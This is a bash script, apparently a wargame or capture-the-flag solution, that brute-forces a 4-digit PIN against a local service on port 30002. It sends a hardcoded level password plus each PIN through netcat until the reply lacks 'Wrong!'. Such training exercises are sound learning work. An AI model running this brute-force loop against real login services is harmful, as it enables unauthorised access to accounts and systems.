#!/bin/bash

# NOTE This method is really slow, but is a good example of a simple brute force script.

# Define the password and target connection details
PASSWORD="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"
PORT="30002"
HOST="localhost"

# Loop through all 4-digit PIN combinations (from 0000 to 9999)
for PIN in $(seq -f "%04g" 0 9999); do
    # Construct the full message by appending the password and PIN
    MESSAGE="$PASSWORD $PIN"
    
    # Use netcat (nc) to send the message to the server and capture the response
    RESPONSE=$(echo "$MESSAGE" | nc -w 2 $HOST $PORT)
    
    # If the response doesn't contain "Wrong!", consider it a success
    if ! echo "$RESPONSE" | grep -q "Wrong!"; then
        echo "Success! The correct PIN is: $PIN"
        break
    else
        echo "Incorrect PIN: $PIN"
    fi
    
    # Optional: Sleep briefly between requests to avoid overwhelming the server
    sleep 0.1
done

